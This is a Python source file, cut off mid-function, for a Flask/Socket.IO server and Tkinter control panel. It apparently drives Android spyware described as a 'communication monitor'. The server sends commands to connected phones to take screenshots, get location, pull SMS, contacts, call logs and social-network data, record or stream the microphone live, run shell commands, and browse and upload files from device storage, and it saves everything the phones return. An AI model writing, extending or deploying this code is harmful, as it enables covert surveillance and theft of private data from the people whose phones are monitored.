import os
import json
import datetime
import threading
import logging
import webbrowser
import subprocess
import sys
import time
import wave
import queue
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog, Menu

try:
    import sounddevice as sd
    import numpy as np

    SOUNDDEVICE_AVAILABLE = True
except ImportError:
    SOUNDDEVICE_AVAILABLE = False
    print(
        "WARNING: sounddevice or numpy not found. Live audio playback will be disabled."
    )
except Exception as e:
    SOUNDDEVICE_AVAILABLE = False
    print(
        f"WARNING: Error importing sounddevice/numpy: {e}. Live audio playback will be disabled."
    )

try:
    from PIL import Image, ImageTk

    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("WARNING: PIL not found. Image preview will be disabled.")

from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit


# --- Configuration ---
class AppConfig:
    APP_ROOT = os.path.dirname(os.path.abspath(__file__))
    DATA_RECEIVED_DIR = os.path.join(APP_ROOT, "received_data")
    DEVICE_TAGS_FILE = os.path.join(APP_ROOT, "device_tags.json")
    SECRET_KEY = "Adv_Comm_Monitor_SecKey_V8_Complete_Enhanced_Features"

    # Audio parameters
    REC_SAMPLERATE = 16000
    REC_CHANNELS = 1
    REC_SAMPWIDTH = 2


# --- Command Constants ---
class Commands:
    SIO_CMD_TAKE_SCREENSHOT = "command_take_screenshot"
    SIO_CMD_LIST_FILES = "command_list_files"
    SIO_CMD_GET_LOCATION = "command_get_location"
    SIO_CMD_UPLOAD_SPECIFIC_FILE = "command_upload_specific_file"
    SIO_CMD_EXECUTE_SHELL = "command_execute_shell"
    SIO_CMD_GET_SMS_LIST = "command_get_sms_list"
    SIO_CMD_RECORD_AUDIO_FIXED = "command_record_audio_fixed"
    SIO_CMD_START_LIVE_AUDIO = "command_start_live_audio"
    SIO_CMD_STOP_LIVE_AUDIO = "command_stop_live_audio"
    SIO_EVENT_LIVE_AUDIO_CHUNK = "live_audio_chunk"
    SIO_CMD_GET_SOCIAL_NETWORK = "command_get_social_network_data"
    SIO_CMD_GET_COMMUNICATION_HISTORY = "command_get_communication_history"
    SIO_CMD_GET_CONTACTS_LIST = "command_get_contacts_list"
    SIO_CMD_GET_CALL_LOGS = "command_get_call_logs"
    SIO_EVENT_REQUEST_REGISTRATION_INFO = "request_registration_info"

    # Document Library Commands
    SIO_CMD_CATALOG_LIBRARY = "command_catalog_library"
    SIO_CMD_ANALYZE_CONTENT = "command_analyze_content"
    SIO_CMD_PROCESS_QUEUE = "command_process_queue"


# --- Utilities ---
class Utils:
    @staticmethod
    def sanitize_device_id(device_id):
        """تنظيف معرف الجهاز للاستخدام كاسم مجلد"""
        if not device_id or not isinstance(device_id, str) or len(device_id) < 3:
            return f"unidentified_device_{datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')}"

        sanitized = "".join(
            c if c.isalnum() or c in ["_", "-", "."] else "_" for c in device_id
        )

        if (
            not sanitized
            or sanitized.lower()
            in ["unknown_model_unknown_device", "_", "unknown_device_unknown_model"]
            or len(sanitized) < 3
        ):
            return f"unidentified_device_{datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')}"

        return sanitized

    @staticmethod
    def create_json_response(status, message=None, **kwargs):
        """إنشاء استجابة JSON موحدة"""
        response = {"status": status, "timestamp": datetime.datetime.now().isoformat()}
        if message:
            response["message"] = message
        response.update(kwargs)
        return response

    @staticmethod
    def get_file_icon(filename):
        """Get file icon based on extension"""
        ext = os.path.splitext(filename)[1].lower()
        icons = {
            ".json": "📊",
            ".txt": "📝",
            ".log": "📋",
            ".jpg": "🖼️",
            ".jpeg": "🖼️",
            ".png": "🖼️",
            ".gif": "🖼️",
            ".mp3": "🎵",
            ".wav": "🎵",
            ".3gp": "🎵",
            ".m4a": "🎵",
            ".mp4": "🎬",
            ".avi": "🎬",
            ".mov": "🎬",
            ".pdf": "📄",
            ".doc": "📄",
            ".docx": "📄",
            ".zip": "🗜️",
            ".rar": "🗜️",
            ".7z": "🗜️",
        }
        return icons.get(ext, "📄")


# --- Device Manager ---
class DeviceManager:
    def __init__(self):
        self.device_tags = {}
        self.load_device_tags()

    def load_device_tags(self):
        """تحميل علامات الأجهزة من الملف"""
        try:
            if os.path.exists(AppConfig.DEVICE_TAGS_FILE):
                with open(AppConfig.DEVICE_TAGS_FILE, "r", encoding="utf-8") as f:
                    self.device_tags = json.load(f)
                logger.info(f"Loaded {len(self.device_tags)} device tags")
        except Exception as e:
            logger.error(f"Error loading device tags: {e}", exc_info=True)
            self.device_tags = {}

    def save_device_tags(self):
        """حفظ علامات الأجهزة إلى الملف"""
        try:
            with open(AppConfig.DEVICE_TAGS_FILE, "w", encoding="utf-8") as f:
                json.dump(self.device_tags, f, ensure_ascii=False, indent=4)
            logger.info("Saved device tags")
        except Exception as e:
            logger.error(f"Error saving device tags: {e}", exc_info=True)

    def set_tag(self, device_id, tag):
        """وضع علامة على جهاز"""
        if tag.strip():
            self.device_tags[device_id] = tag.strip()
        else:
            self.device_tags.pop(device_id, None)
        self.save_device_tags()

    def get_tag(self, device_id):
        """الحصول على علامة الجهاز"""
        return self.device_tags.get(device_id, "")


# --- Flask App Setup ---
os.makedirs(AppConfig.DATA_RECEIVED_DIR, exist_ok=True)

app = Flask(__name__)
app.config["SECRET_KEY"] = AppConfig.SECRET_KEY
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    logger=False,
    engineio_logger=False,
)

# Logging Setup
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("AdvancedCommMonitor")

# Global Variables
connected_clients_sio = {}
device_manager = DeviceManager()
gui_app = None

# Audio Variables
audio_queue = queue.Queue()
stream_active_for_device = {}
playback_thread = None
live_audio_buffers = {}


# --- Remote File System Manager ---
class RemoteFileSystemManager:
    def __init__(self):
        self.file_cache = {}  # {device_id: {path: [files]}}
        self.last_update = {}  # {device_id: timestamp}
        self.pending_operations = {}  # {device_id: {command_id: {operation_details}}}

    def clear_cache(self, device_id=None):
        """Clear the file cache for a specific device or all devices"""
        if device_id:
            self.file_cache.pop(device_id, None)
            self.last_update.pop(device_id, None)
        else:
            self.file_cache.clear()
            self.last_update.clear()

    def add_files_to_cache(self, device_id, path, files_list):
        """Add files to the cache for a specific device and path"""
        if device_id not in self.file_cache:
            self.file_cache[device_id] = {}

        self.file_cache[device_id][path] = files_list
        self.last_update[device_id] = datetime.datetime.now()

    def get_files_from_cache(self, device_id, path):
        """Get files from cache for a specific device and path"""
        if device_id not in self.file_cache:
            return None

        return self.file_cache[device_id].get(path)

    def is_cache_valid(self, device_id, path, max_age_seconds=60):
        """Check if the cache is still valid"""
        if device_id not in self.last_update:
            return False

        if device_id not in self.file_cache or path not in self.file_cache[device_id]:
            return False

        age = (datetime.datetime.now() - self.last_update[device_id]).total_seconds()
        return age < max_age_seconds

    def add_pending_operation(
        self, device_id, command_id, operation_type, details=None
    ):
        """Add a pending operation for a device"""
        if device_id not in self.pending_operations:
            self.pending_operations[device_id] = {}

        self.pending_operations[device_id][command_id] = {
            "type": operation_type,
            "details": details or {},
            "timestamp": datetime.datetime.now().isoformat(),
        }

    def get_pending_operations(self, device_id):
        """Get all pending operations for a device"""
        return self.pending_operations.get(device_id, {})

    def remove_pending_operation(self, device_id, command_id):
        """Remove a pending operation"""
        if device_id in self.pending_operations:
            self.pending_operations[device_id].pop(command_id, None)


# Initialize Remote File System Manager
remote_fs_manager = RemoteFileSystemManager()


# --- File Upload Handler ---
class FileUploadHandler:
    @staticmethod
    def handle_initial_data(request_data):
        """معالجة رفع البيانات الأولية"""
        logger.info("Request to /upload_initial_data")
        try:
            json_data_str = request_data.form.get("json_data")
            if not json_data_str:
                logger.error("No json_data found in request.")
                return Utils.create_json_response("error", "Missing json_data"), 400

            data = json.loads(json_data_str)
            raw_device_id = data.get("deviceId")
            device_info_for_fallback = data.get("deviceInfo", {})

            if not raw_device_id:
                model = device_info_for_fallback.get("model", "unknown_model")
                name = device_info_for_fallback.get("deviceName", "unknown_device")
                raw_device_id = (
                    f"{model}_{name}_{datetime.datetime.now().strftime('%S%f')}"
                )
                logger.warning(f"Using fallback deviceId: {raw_device_id}")

            device_id_sanitized = Utils.sanitize_device_id(raw_device_id)
            device_folder_path = os.path.join(
                AppConfig.DATA_RECEIVED_DIR, device_id_sanitized
            )
            os.makedirs(device_folder_path, exist_ok=True)

            # Save JSON data
            info_file_name = (
                f'initial_data_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
            )
            info_file_path = os.path.join(device_folder_path, info_file_name)
            with open(info_file_path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=4)
            logger.info(f"Saved JSON to {info_file_path}")

            # Save image if exists
            image_file = request_data.files.get("image")
            if image_file and image_file.filename:
                filename = os.path.basename(image_file.filename)
                base, ext = os.path.splitext(filename)
                if not ext:
                    ext = ".jpg"
                image_filename = f"initial_img_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
                image_path = os.path.join(device_folder_path, image_filename)
                image_file.save(image_path)
                logger.info(f"Saved image to {image_path}")

            # Update GUI
            if gui_app and gui_app.master.winfo_exists():
                gui_app.add_system_log(
                    f"Initial data received from monitor: {device_id_sanitized}"
                )
                gui_app.refresh_historical_device_list()

            return Utils.create_json_response("success", "Initial data received"), 200

        except json.JSONDecodeError as e:
            logger.error(f"Invalid JSON: {e}")
            return Utils.create_json_response("error", "Invalid JSON format"), 400
        except Exception as e:
            logger.error(f"Error processing initial data: {e}", exc_info=True)
            return (
                Utils.create_json_response("error", f"Internal server error: {str(e)}"),
                500,
            )

    @staticmethod
    def handle_command_file(request_data):
        """معالجة رفع ملفات الأوامر"""
        logger.info("Request to /upload_command_file")
        try:
            device_id = request_data.form.get("deviceId")
            command_ref = request_data.form.get("commandRef", "unknown_cmd_ref")
            command_id_from_req = request_data.form.get("commandId", "N_A")
            data_type = request_data.form.get("dataType", "unknown_data_type")

            if not device_id:
                logger.error("'deviceId' missing.")
                return Utils.create_json_response("error", "Missing deviceId"), 400

            device_id_sanitized = Utils.sanitize_device_id(device_id)
            device_folder_path = os.path.join(
                AppConfig.DATA_RECEIVED_DIR, device_id_sanitized
            )
            os.makedirs(device_folder_path, exist_ok=True)

            file_data = request_data.files.get("file")
            if file_data and file_data.filename:
                original_filename = os.path.basename(file_data.filename)
                base, ext = os.path.splitext(original_filename)
                if not ext:
                    ext = ".dat"

                safe_command_ref = "".join(
                    c if c.isalnum() else "_" for c in command_ref
                )
                safe_command_id = (
                    "".join(c if c.isalnum() else "_" for c in command_id_from_req)
                    if command_id_from_req != "N_A"
                    else "no_id"
                )

                # Determine save path based on data type
                if data_type == "structured_analysis":
                    analysis_folder = os.path.join(
                        device_folder_path, "structured_analysis"
                    )
                    os.makedirs(analysis_folder, exist_ok=True)
                    file_path = analysis_folder
                elif data_type == "audio_data":
                    audio_folder = os.path.join(device_folder_path, "audio_recordings")
                    os.makedirs(audio_folder, exist_ok=True)
                    file_path = audio_folder
                else:
                    file_path = device_folder_path

                new_filename = f"{safe_command_ref}_{base.replace(' ', '_')}_{safe_command_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
                full_file_path = os.path.join(file_path, new_filename)

                file_data.save(full_file_path)
                logger.info(
                    f"Saved monitoring data '{new_filename}' for monitor '{device_id_sanitized}' to {full_file_path}"
                )

                # If this is a response to list_files, process it to populate the file tree
                if command_ref == "list_files" and command_id_from_req != "N_A":
                    try:
                        with open(full_file_path, "r", encoding="utf-8") as f:
                            files_data = json.load(f)
                            if "data" in files_data and "path" in files_data.get(
                                "data", {}
                            ):
                                path = files_data["data"]["path"]
                                files_list = files_data["data"].get("files", [])
                                remote_fs_manager.add_files_to_cache(
                                    device_id_sanitized, path, files_list
                                )
                                # Process pending operation if it was a tree view request
                                remote_fs_manager.remove_pending_operation(
                                    device_id_sanitized, command_id_from_req
                                )

                                # Update the file tree if GUI exists and the file browser is showing this device
                                if (
                                    gui_app
                                    and gui_app.master.winfo_exists()
                                    and hasattr(gui_app, "file_browser")
                                    and gui_app.file_browser.current_device_id
                                    == device_id_sanitized
                                ):
                                    gui_app.file_browser.populate_tree_for_path(path)
                    except Exception as e:
                        logger.error(
                            f"Error processing list_files response: {e}", exc_info=True
                        )

                # Update GUI
                if gui_app and gui_app.master.winfo_exists():
                    gui_app.add_system_log(
                        f"Received '{new_filename}' from '{device_id_sanitized}' (Type: {data_type})"
                    )
                    if (
                        gui_app.current_selected_historical_device_id
                        == device_id_sanitized
                    ):
                        gui_app.display_device_details(device_id_sanitized)

                        # If there's a file browser open for this device, refresh it
                        if (
                            hasattr(gui_app, "file_browser")
                            and gui_app.file_browser.current_device_id
                            == device_id_sanitized
                        ):
                            gui_app.file_browser.refresh_current_directory()

                return (
                    Utils.create_json_response(
                        "success",
                        "Monitoring data received by Control Panel",
                        filename_on_server=new_filename,
                    ),
                    200,
                )
            else:
                logger.error("No file data in request.")
                return Utils.create_json_response("error", "Missing file data"), 400

        except Exception as e:
            logger.error(f"Error in upload_command_file: {e}", exc_info=True)
            return Utils.create_json_response("error", f"Server error: {str(e)}"), 500


# --- Socket Event Handlers ---
class SocketEventHandler:
    @staticmethod
    def handle_connect():
        """معالج الاتصال الجديد"""
        client_sid = request.sid
        logger.info(
            f"Monitor attempting connection: SID={client_sid}, IP={request.remote_addr}"
        )
        emit(
            Commands.SIO_EVENT_REQUEST_REGISTRATION_INFO,
            {"message": "Please register monitoring device."},
            room=client_sid,
        )

    @staticmethod
    def handle_disconnect():
        """معالج قطع الاتصال"""
        client_sid = request.sid
        dev_id_display = client_sid

        stream_active_for_device.pop(client_sid, None)

        if client_sid in connected_clients_sio:
            device_info = connected_clients_sio.pop(client_sid)
            dev_id_display = device_info.get("id", client_sid)
            logger.info(f"Monitor '{dev_id_display}' disconnected (SID={client_sid})")

            # Update GUI
            if gui_app and gui_app.master.winfo_exists():
                gui_app.update_live_clients_list()
                gui_app.add_system_log(f"Monitor '{dev_id_display}' disconnected")
                if gui_app.current_selected_live_client_sid == client_sid:
                    gui_app._enable_commands(False)
                    gui_app.current_selected_live_client_sid = None
                    gui_app.live_audio_status_var.set(
                        "Live Audio: Idle (Monitor Disconnected)"
                    )
                    if SOUNDDEVICE_AVAILABLE:
                        gui_app.start_live_audio_button.config(state=tk.DISABLED)
                        gui_app.stop_live_audio_button.config(state=tk.DISABLED)

                    # Close file browser if it's open for this device
                    if hasattr(gui_app, "file_browser"):
                        if gui_app.file_browser.current_device_id == dev_id_display:
                            gui_app.file_browser.close()

        # Clear audio buffer
        if client_sid in live_audio_buffers:
            buffered_info = live_audio_buffers.pop(client_sid, None)
            if buffered_info and buffered_info["data"]:
                logger.info(
                    f"Cleared unsaved live audio buffer for disconnected monitor {dev_id_display}"
                )

    @staticmethod
    def handle_register_device(data):
        """معالج تسجيل جهاز جديد"""
        client_sid = request.sid
        try:
            device_identifier = data.get("deviceId")
            device_name_display = data.get("deviceName", f"Monitor_{client_sid[:6]}")
            device_platform = data.get("platform", "Unknown")
            device_capabilities = data.get("capabilities", [])

            if not device_identifier:
                logger.error(
                    f"Registration failed for SID {client_sid}: 'deviceId' missing."
                )
                emit(
                    "registration_failed",
                    {"message": "Missing 'deviceId' in registration payload."},
                    room=client_sid,
                )
                return

            connected_clients_sio[client_sid] = {
                "sid": client_sid,
                "id": device_identifier,
                "name_display": device_name_display,
                "platform": device_platform,
                "capabilities": device_capabilities,
                "ip": request.remote_addr,
                "connected_at": datetime.datetime.now().isoformat(),
                "last_seen": datetime.datetime.now().isoformat(),
            }

            logger.info(
                f"Monitor registered: ID='{device_identifier}', Name='{device_name_display}'"
            )

            emit(
                "registration_successful",
                {
                    "message": "Monitor successfully registered.",
                    "sid": client_sid,
                    "deviceId": device_identifier,
                },
                room=client_sid,
            )

            # Update GUI
            if gui_app and gui_app.master.winfo_exists():
                gui_app.update_live_clients_list()
                gui_app.add_system_log(
                    f"Monitor '{device_name_display}' connected from {request.remote_addr}"
                )

        except Exception as e:
            logger.error(
                f"Error in handle_register_device for SID {client_sid}: {e}",
                exc_info=True,
            )
            emit(
                "registration_failed",
                {"message": "Server error during monitor registration."},
                room=client_sid,
            )

    @staticmethod
    def handle_heartbeat(data):
        """معالج نبضات الحياة"""
        client_sid = request.sid
        if client_sid in connected_clients_sio:
            connected_clients_sio[client_sid][
                "last_seen"
            ] = datetime.datetime.now().isoformat()
            if gui_app and gui_app.master.winfo_exists():
                gui_app.update_live_clients_list_item(client_sid)

    @staticmethod
    def handle_live_audio_chunk(data):
        """معالج أجزاء البث الصوتي المباشر"""
        client_sid = request.sid
        if client_sid not in connected_clients_sio:
            logger.warning(
                f"Received audio chunk from unknown monitor SID: {client_sid}"
            )
            return

        if not stream_active_for_device.get(client_sid, False):
            return

        audio_data_bytes = data.get("audio_data")
        if isinstance(audio_data_bytes, bytes):
            if SOUNDDEVICE_AVAILABLE:
                audio_queue.put(audio_data_bytes)

            if client_sid in live_audio_buffers:
                live_audio_buffers[client_sid]["data"].append(audio_data_bytes)

            if (
                gui_app
                and gui_app.master.winfo_exists()
                and gui_app.current_selected_live_client_sid == client_sid
            ):
                status_msg = f"Live Audio: Receiving from {connected_clients_sio[client_sid].get('id', client_sid)}..."
                if not SOUNDDEVICE_AVAILABLE:
                    status_msg = "Live Audio: Receiving (Playback Disabled)"
                gui_app.live_audio_status_var.set(status_msg)


# --- Command Sender ---
def send_command_to_client(target_id, command_name, args=None):
    """إرسال أمر إلى عميل محدد"""
    args = args if args is not None else {}
    sid_to_use = None

    if target_id in connected_clients_sio:
        sid_to_use = target_id
    else:
        sid_to_use = next(
            (
                s
                for s, info in connected_clients_sio.items()
                if info.get("id") == target_id
            ),
            None,
        )

    if not sid_to_use:
        errmsg = f"Target monitor '{target_id}' not found or not live for command '{command_name}'"
        logger.error(errmsg)
        if gui_app and gui_app.master.winfo_exists():
            messagebox.showerror("Command Error", errmsg, parent=gui_app.master)
        return {"status": "error", "message": errmsg, "command_id": None}

    dev_id_for_log = connected_clients_sio[sid_to_use].get("id", "UnknownMonitorID")
    cmd_id = f"{command_name.replace('command_', '')}_{datetime.datetime.now().strftime('%H%M%S%f')}"
    payload = {"command": command_name, "command_id": cmd_id, "args": args}

    logger.info(
        f"Sending cmd '{command_name}' (ID: {cmd_id}) to monitor '{dev_id_for_log}'"
    )

    try:
        socketio.emit("command", payload, room=sid_to_use)
        if gui_app and gui_app.master.winfo_exists():
            gui_app.add_system_log(
                f"Sent cmd '{command_name}' (ID: {cmd_id}) to monitor '{dev_id_for_log}'"
            )

        # Store command in pending operations if it's a file listing command
        if command_name == Commands.SIO_CMD_LIST_FILES:
            remote_fs_manager.add_pending_operation(
                dev_id_for_log, cmd_id, "list_files", {"path": args.get("path", "/")}
            )

        return {"status": "sent", "command_id": cmd_id}
    except Exception as e_emit:
        errmsg = f"Error emitting cmd '{command_name}' to SID {sid_to_use}: {e_emit}"
        logger.error(errmsg, exc_info=True)
        if gui_app and gui_app.master.winfo_exists():
            messagebox.showerror("Emit Error", errmsg, parent=gui_app.master)
        return {"status": "error", "message": errmsg, "command_id": cmd_id}


# --- Flask Routes ---
@app.route("/")
def index():
    return "Advanced Communication Monitor Control Panel - Ready for connections..."


@app.route("/status")
def status():
    """حالة النظام والإحصائيات"""
    return jsonify(
        {
            "status": "running",
            "connected_monitors": len(connected_clients_sio),
            "active_streams": len(
                [sid for sid, active in stream_active_for_device.items() if active]
            ),
            "server_time": datetime.datetime.now().isoformat(),
            "features": {
                "audio_playback": SOUNDDEVICE_AVAILABLE,
                "image_preview": PIL_AVAILABLE,
                "social_network_analysis": True,
                "communication_history": True,
            },
        }
    )


@app.route("/upload_initial_data", methods=["POST"])
def upload_initial_data():
    return FileUploadHandler.handle_initial_data(request)


@app.route("/upload_command_file", methods=["POST"])
def upload_command_file():
    return FileUploadHandler.handle_command_file(request)


# --- Socket Event Registration ---
@socketio.on("connect")
def handle_sio_connect():
    return SocketEventHandler.handle_connect()


@socketio.on("disconnect")
def handle_sio_disconnect():
    return SocketEventHandler.handle_disconnect()


@socketio.on("register_device")
def handle_register_device(data):
    return SocketEventHandler.handle_register_device(data)


@socketio.on("device_heartbeat")
def handle_device_heartbeat(data):
    return SocketEventHandler.handle_heartbeat(data)


@socketio.on(Commands.SIO_EVENT_LIVE_AUDIO_CHUNK)
def handle_live_audio_chunk(data):
    return SocketEventHandler.handle_live_audio_chunk(data)


# --- GUI Base Classes ---
class BaseGUIComponent:
    """مكون واجهة أساسي"""

    def __init__(self, parent):
        self.parent = parent
        self.setup_component()

    def setup_component(self):
        """إعداد المكون - يجب تنفيذه في الفئات المشتقة"""
        pass

    def update_status(self, message, level="info"):
        """تحديث الحالة"""
        if hasattr(self.parent, "add_system_log"):
            self.parent.add_system_log(message, level)


class ListManager:
    """مدير القوائم"""

    def __init__(self, listbox, data_source):
        self.listbox = listbox
        self.data_source = data_source
        self.items_in_listbox = []

    def refresh_list(self, items, format_func):
        """تحديث القائمة"""
        self.listbox.delete(0, tk.END)
        self.items_in_listbox = []

        if not items:
            self.listbox.insert(tk.END, "No items found")
            self.listbox.config(fg="grey")
        else:
            self.listbox.config(fg="black")
            for item in items:
                display_entry = format_func(item)
                self.listbox.insert(tk.END, display_entry)
                self.items_in_listbox.append(item)

    def get_selected_item(self):
        """الحصول على العنصر المحدد"""
        selection = self.listbox.curselection()
        if selection:
            index = selection[0]
            if 0 <= index < len(self.items_in_listbox):
                return self.items_in_listbox[index]
        return None


# --- File Browser Component ---
class FileBrowserWindow:
    def __init__(self, master, device_id, target_id, parent_app):
        self.master = master
        self.window = tk.Toplevel(master)
        self.window.title(f"File Browser - {device_id}")
        self.window.geometry("900x600")
        self.window.minsize(800, 500)

        self.device_id = device_id
        self.current_device_id = device_id
        self.target_id = target_id
        self.parent_app = parent_app
        self.current_path = "/sdcard"  # بدء التصفح من مجلد بطاقة الذاكرة بدلاً من الجذر
        self.path_history = ["/sdcard"]
        self.history_pos = 0

        # تعريف المجلدات الشائعة للوصول السريع
        self.common_folders = [
            ("/sdcard", "📁 بطاقة الذاكرة (SD Card)"),
            ("/storage/emulated/0", "📁 التخزين الداخلي (Internal Storage)"),
            ("/sdcard/Download", "📁 التنزيلات (Downloads)"),
            ("/sdcard/DCIM", "📁 الكاميرا (Camera)"),
            ("/sdcard/Pictures", "📁 الصور (Pictures)"),
            ("/sdcard/Documents", "📁 المستندات (Documents)"),
            ("/sdcard/Movies", "📁 الفيديو (Movies)"),
            ("/sdcard/Music", "📁 الموسيقى (Music)"),
            ("/sdcard/Android/data", "📁 بيانات التطبيقات (App Data)"),
        ]

        self._setup_ui()

        # طلب قائمة الملفات مباشرة عند الفتح
        self.list_files_for_path("/sdcard")

        # Set up closing event
        self.window.protocol("WM_DELETE_WINDOW", self.close)

    def _setup_ui(self):
        """Set up the UI components"""
        # Main frame
        main_frame = ttk.Frame(self.window)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Toolbar frame
        toolbar_frame = ttk.Frame(main_frame)
        toolbar_frame.pack(fill=tk.X, padx=5, pady=5)

        # Navigation buttons
        self.back_button = ttk.Button(
            toolbar_frame, text="🔙 Back", command=self.go_back
        )
        self.back_button.pack(side=tk.LEFT, padx=2)

        self.forward_button = ttk.Button(
            toolbar_frame, text="🔜 Forward", command=self.go_forward
        )
        self.forward_button.pack(side=tk.LEFT, padx=2)
        self.forward_button.config(state=tk.DISABLED)  # Initially disabled

        self.up_button = ttk.Button(toolbar_frame, text="🔝 Up", command=self.go_up)
        self.up_button.pack(side=tk.LEFT, padx=2)

        self.refresh_button = ttk.Button(
            toolbar_frame, text="🔄 Refresh", command=self.refresh_current_directory
        )
        self.refresh_button.pack(side=tk.LEFT, padx=2)

        # Path entry
        ttk.Label(toolbar_frame, text="Path:").pack(side=tk.LEFT, padx=(10, 2))
        self.path_var = tk.StringVar(value="/")
        self.path_entry = ttk.Entry(toolbar_frame, textvariable=self.path_var, width=50)
        self.path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        self.path_entry.bind("<Return>", lambda e: self.navigate_to_path())

        self.go_button = ttk.Button(
            toolbar_frame, text="Go", command=self.navigate_to_path
        )
        self.go_button.pack(side=tk.LEFT, padx=2)

        # Status bar
        self.status_var = tk.StringVar(value="Ready")
        status_bar = ttk.Label(
            main_frame, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W
        )
        status_bar.pack(side=tk.BOTTOM, fill=tk.X, padx=5, pady=2)

        # Content frame (paned window for tree and details)
        content_frame = ttk.PanedWindow(main_frame, orient=tk.HORIZONTAL)
        content_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # قسم المجلدات المفضلة
        favorites_frame = ttk.LabelFrame(content_frame, text="المجلدات الشائعة")
        content_frame.add(favorites_frame, weight=1)

        self.favorites_listbox = tk.Listbox(
            favorites_frame, height=15, font=("Arial", 9)
        )
        favorites_scrollbar = ttk.Scrollbar(
            favorites_frame, orient="vertical", command=self.favorites_listbox.yview
        )
        self.favorites_listbox.config(yscrollcommand=favorites_scrollbar.set)

        self.favorites_listbox.pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
        )
        favorites_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # إضافة المجلدات الشائعة إلى القائمة
        for path, name in self.common_folders:
            self.favorites_listbox.insert(tk.END, name)

        # ربط حدث النقر على المجلدات المفضلة
        self.favorites_listbox.bind("<Double-1>", self.on_favorite_double_click)

        # Tree view frame
        tree_frame = ttk.Frame(content_frame)
        content_frame.add(tree_frame, weight=2)

        # Tree view with scrollbars
        self.tree = ttk.Treeview(tree_frame, columns=("size", "date", "type"))
        self.tree.heading("#0", text="Name")
        self.tree.heading("size", text="Size")
        self.tree.heading("date", text="Date Modified")
        self.tree.heading("type", text="Type")

        self.tree.column("#0", width=300, stretch=tk.YES)
        self.tree.column("size", width=100, anchor=tk.E)
        self.tree.column("date", width=150)
        self.tree.column("type", width=100)

        scrollbar_y = ttk.Scrollbar(
            tree_frame, orient="vertical", command=self.tree.yview
        )
        scrollbar_x = ttk.Scrollbar(
            tree_frame, orient="horizontal", command=self.tree.xview
        )
        self.tree.configure(
            yscrollcommand=scrollbar_y.set, xscrollcommand=scrollbar_x.set
        )

        scrollbar_y.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
        scrollbar_x.pack(side=tk.BOTTOM, fill=tk.X)

        # Bind events for tree
        self.tree.bind("<Double-1>", self.on_tree_double_click)
        self.tree.bind(
            "<Button-3>", self.on_tree_right_click
        )  # Right-click for context menu
        self.tree.bind("<<TreeviewSelect>>", self.on_tree_select)

        # Details frame
        details_frame = ttk.LabelFrame(content_frame, text="File Details")
        content_frame.add(details_frame, weight=1)

        self.details_text = scrolledtext.ScrolledText(
            details_frame, height=10, wrap=tk.WORD, state=tk.DISABLED
        )
        self.details_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Bottom buttons frame
        buttons_frame = ttk.Frame(main_frame)
        buttons_frame.pack(fill=tk.X, padx=5, pady=5)

        self.upload_button = ttk.Button(
            buttons_frame, text="📤 Upload Selected", command=self.upload_selected
        )
        self.upload_button.pack(side=tk.LEFT, padx=5)

        self.analyze_button = ttk.Button(
            buttons_frame, text="🔍 Analyze Selected", command=self.analyze_selected
        )
        self.analyze_button.pack(side=tk.LEFT, padx=5)

        self.execute_button = ttk.Button(
            buttons_frame, text="⚡ Execute Command", command=self.execute_command
        )
        self.execute_button.pack(side=tk.LEFT, padx=5)

    def on_favorite_double_click(self, event):
        """التعامل مع النقر المزدوج على المجلد المفضل"""
        selection = self.favorites_listbox.curselection()
        if not selection:
            return

        index = selection[0]
        if 0 <= index < len(self.common_folders):
            path = self.common_folders[index][0]
            self.navigate_to_directory(path)

    def on_tree_select(self, event):
        """عرض تفاصيل العنصر المحدد"""
        selected_item = self.tree.focus()
        if selected_item:
            item_path = self.get_full_path(selected_item)
            self.show_file_details(item_path)

    def create_context_menu(self, event):
        """Create and display the context menu"""
        selected_item = self.tree.focus()
        if not selected_item:
            return

        context_menu = Menu(self.window, tearoff=0)

        # Get item type (file or directory)
        item_type = self.tree.item(selected_item, "values")[-1]
        item_path = self.get_full_path(selected_item)

        if item_type == "Directory":
            context_menu.add_command(
                label="Open", command=lambda: self.open_directory(item_path)
            )
            context_menu.add_command(
                label="List Files", command=lambda: self.list_files_for_path(item_path)
            )
        else:
            context_menu.add_command(
                label="Upload", command=lambda: self.upload_file(item_path)
            )
            context_menu.add_command(
                label="Analyze", command=lambda: self.analyze_file(item_path)
            )

        context_menu.add_separator()
        context_menu.add_command(
            label="Copy Path", command=lambda: self.copy_path_to_clipboard(item_path)
        )

        # Display the menu
        try:
            context_menu.tk_popup(event.x_root, event.y_root)
        finally:
            context_menu.grab_release()

    def copy_path_to_clipboard(self, path):
        """Copy the path to clipboard"""
        self.window.clipboard_clear()
        self.window.clipboard_append(path)
        self.status_var.set(f"Copied to clipboard: {path}")

    def get_full_path(self, item_id):
        """Get the full path for a tree item"""
        if not item_id:
            return self.current_path

        item_text = self.tree.item(item_id, "text")
        # استخراج النص بدون الأيقونة
        if " " in item_text:
            item_text = item_text.split(" ", 1)[1]

        if self.current_path.endswith("/"):
            return f"{self.current_path}{item_text}"
        else:
            return f"{self.current_path}/{item_text}"

    def on_tree_right_click(self, event):
        """Handle right-click on tree items"""
        # Select the item under cursor
        item_id = self.tree.identify_row(event.y)
        if item_id:
            self.tree.selection_set(item_id)
            self.tree.focus(item_id)
            self.create_context_menu(event)

    def on_tree_double_click(self, event):
